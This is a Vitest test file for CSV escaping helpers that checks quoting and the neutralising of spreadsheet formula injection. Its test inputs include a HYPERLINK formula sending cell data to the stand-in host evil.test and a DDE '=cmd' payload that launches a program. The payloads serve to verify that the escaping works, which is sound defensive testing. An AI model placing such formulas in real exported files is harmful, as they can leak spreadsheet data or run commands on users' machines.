import { describe, it, expect } from 'vitest'
import { escapeCsvCell, toCsvRow, toCsv } from '../utils/csv'

describe('escapeCsvCell', () => {
  it('leaves plain values untouched', () => {
    expect(escapeCsvCell('prod-vpc')).toBe('prod-vpc')
    expect(escapeCsvCell('10.0.0.0/8')).toBe('10.0.0.0/8')
  })

  it('renders null and undefined as empty cells', () => {
    expect(escapeCsvCell(null)).toBe('')
    expect(escapeCsvCell(undefined)).toBe('')
  })

  it('quotes values containing a delimiter', () => {
    expect(escapeCsvCell('us-east-1, us-west-2')).toBe('"us-east-1, us-west-2"')
  })

  it('quotes and doubles embedded quotes', () => {
    expect(escapeCsvCell('say "hi"')).toBe('"say ""hi"""')
  })

  it('quotes values containing newlines', () => {
    expect(escapeCsvCell('line1\nline2')).toBe('"line1\nline2"')
    expect(escapeCsvCell('line1\r\nline2')).toBe('"line1\r\nline2"')
  })

  it('neutralises spreadsheet formula prefixes', () => {
    expect(escapeCsvCell('=1+1')).toBe("'=1+1")
    expect(escapeCsvCell('+SUM(A1)')).toBe("'+SUM(A1)")
    expect(escapeCsvCell('-2+3')).toBe("'-2+3")
    expect(escapeCsvCell('@SUM(A1)')).toBe("'@SUM(A1)")
  })

  it('neutralises the classic HYPERLINK exfiltration payload', () => {
    expect(escapeCsvCell('=HYPERLINK("http://evil.test?d="&A1,"click")')).toBe(
      '"\'=HYPERLINK(""http://evil.test?d=""&A1,""click"")"',
    )
  })

  it('escapes a formula that also needs quoting', () => {
    expect(escapeCsvCell('=cmd|"/c calc"!A1')).toBe('"\'=cmd|""/c calc""!A1"')
  })

  it('does not mangle names that merely contain a dash', () => {
    expect(escapeCsvCell('us-east-1')).toBe('us-east-1')
  })
})

describe('toCsvRow', () => {
  it('joins escaped cells with commas', () => {
    expect(toCsvRow(['prod', '10.0.0.0/8', null])).toBe('prod,10.0.0.0/8,')
  })

  it('keeps injected commas inside a single field', () => {
    expect(toCsvRow(['a,b', 'c'])).toBe('"a,b",c')
  })
})

describe('toCsv', () => {
  it('emits a header row followed by escaped data rows', () => {
    const csv = toCsv(
      ['name', 'cidr', 'type', 'parent_name'],
      [
        ['prod', '10.0.0.0/16', 'environment', 'root'],
        ['=evil()', '10.1.0.0/16', 'environment', 'root, primary'],
      ],
    )

    expect(csv.split('\n')).toEqual([
      'name,cidr,type,parent_name',
      'prod,10.0.0.0/16,environment,root',
      "'=evil(),10.1.0.0/16,environment,\"root, primary\"",
    ])
  })
})
